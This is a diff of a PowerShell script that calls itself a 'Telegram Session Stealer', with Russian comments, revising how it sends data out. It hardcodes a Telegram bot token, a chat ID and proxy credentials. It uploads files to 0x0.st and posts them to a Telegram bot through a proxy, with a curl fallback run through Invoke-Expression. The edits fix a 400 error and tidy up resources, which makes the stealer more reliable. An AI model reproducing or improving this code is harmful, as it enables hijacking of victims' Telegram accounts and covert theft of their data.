@@ -1,5 +1,5 @@
 # ============================================================
-# Telegram Session Stealer + 0x0.st + Proxy + Детальные ошибки
+# Telegram Session Stealer + 0x0.st + Proxy (400 fix final)
 # ============================================================
 
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
@@ -9,7 +9,7 @@ $chatId   = "8620709143"
 $proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
 $proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")
 
-# Универсальная функция отправки в Telegram (с перехватом ошибок)
+# Функция отправки в Telegram (с UploadData)
 function Send-TelegramMessage {
     param($text)
     $url = "https://api.telegram.org/bot$botToken/sendMessage"
@@ -21,14 +21,15 @@ function Send-TelegramMessage {
     $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
 
     try {
-        $wc.UploadString($url, "POST", $body) | Out-Null
+        $data = [System.Text.Encoding]::UTF8.GetBytes($body)
+        $wc.UploadData($url, "POST", $data) | Out-Null
         return $true
     } catch [System.Net.WebException] {
         $stream = $_.Exception.Response.GetResponseStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $serverError = $reader.ReadToEnd()
         Write-Host "❌ Ошибка Telegram API: $serverError" -ForegroundColor Red
-        # Пробуем fallback через curl (если WebClient не справился)
+        # Fallback через curl (на случай, если UploadData не сработает)
         $tempFile = [System.IO.Path]::GetTempFileName()
         $body | Out-File -FilePath $tempFile -Encoding UTF8
         $proxyUrl = "http://gate.proxydata.ru:3129"
@@ -40,10 +41,12 @@ function Send-TelegramMessage {
     } catch {
         Write-Host "❌ Другая ошибка: $($_.Exception.Message)" -ForegroundColor Red
         return $false
+    } finally {
+        $wc.Dispose()
     }
 }
 
-# Функция загрузки на 0x0.st (с перехватом ошибок)
+# Функция загрузки на 0x0.st (с fallback)
 function Upload-To0x0 {
     param($filePath)
     $wc = New-Object System.Net.WebClient
@@ -65,6 +68,8 @@ function Upload-To0x0 {
         $link = Get-Content $tempOutput -Raw
         Remove-Item $tempOutput -Force
         return $link.Trim()
+    } finally {
+        $wc.Dispose()
     }
 }
 
@@ -119,9 +124,9 @@ try {
         $wc.Proxy = $proxy
         $wc.Encoding = [System.Text.Encoding]::UTF8
         foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
-        $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
 
         try {
+            $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
             $wc.UploadData($url, "POST", $data) | Out-Null
         } catch [System.Net.WebException] {
             $stream = $_.Exception.Response.GetResponseStream()
@@ -136,6 +141,8 @@ try {
             $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -X POST -H 'Content-Type: multipart/form-data; boundary=$boundary' --data-binary @$tempData $url 2>nul"
             Invoke-Expression $cmd
             Remove-Item $tempData -Force
+        } finally {
+            $wc.Dispose()
         }
     }
 
